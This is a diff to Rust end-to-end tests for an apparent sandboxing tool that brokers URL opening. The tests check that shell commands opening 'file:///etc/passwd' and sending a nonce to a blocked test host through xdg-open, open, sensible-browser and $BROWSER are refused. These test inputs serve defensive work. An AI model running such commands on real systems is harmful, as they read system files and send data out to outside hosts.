@@ -820,13 +820,19 @@ fn fw_e2e_090_brokered_open_url() {
             "--",
             "/bin/sh",
             "-c",
-            "xdg-open https://example.test/login && xdg-open file:///etc/passwd; \
-             basename \"$BROWSER\"",
+            "xdg-open https://example.test/login; echo \"https=$?\"; \
+             xdg-open file:///etc/passwd; echo \"file=$?\"; basename \"$BROWSER\"",
         ],
         &[("FORMWORK_HOST_OPENER", fixture.to_str().unwrap())],
     );
     assert_eq!(out.code, 0, "{}", out.stderr);
-    assert_eq!(out.stdout, "xdg-open\n");
+    // The shim mirrors the Gateway's verdict to its caller (a generic refusal, exit 1).
+    assert_eq!(out.stdout, "https=0\nfile=1\nxdg-open\n");
+    assert!(
+        out.stderr.contains("formwork: open-url: refused"),
+        "{}",
+        out.stderr
+    );
     assert_eq!(read_after_exit(&log), "https://example.test/login\n");
     assert!(out.stderr.contains("opened a URL"), "{}", out.stderr);
     assert!(
@@ -851,8 +857,9 @@ fn fw_adv_020_the_opener_does_not_exfiltrate_when_not_lifted() {
     .unwrap();
     let nonce = format!("nonce-{}", std::process::id());
     let script = format!(
-        "xdg-open https://blocked.test/?q={nonce}; open https://blocked.test/?q={nonce}; \
-         sensible-browser https://blocked.test/?q={nonce}; \"$BROWSER\" https://blocked.test/?q={nonce}"
+        "xdg-open https://blocked.test/?q={nonce}; echo \"xdg-open=$?\"; \
+         open https://blocked.test/?q={nonce}; sensible-browser https://blocked.test/?q={nonce}; \
+         \"$BROWSER\" https://blocked.test/?q={nonce}; true"
     );
     let out = formwork(
         dir.path(),
@@ -867,6 +874,7 @@ fn fw_adv_020_the_opener_does_not_exfiltrate_when_not_lifted() {
         read_after_exit(&log)
     );
     assert!(out.stderr.contains("not lifted"), "{}", out.stderr);
+    assert_eq!(out.stdout, "xdg-open=1\n", "the caller hears a refusal");
 }
 
 /// FW-E2E-085 (Linux): a learning run under host rules proposes `https:blocked.test` from the
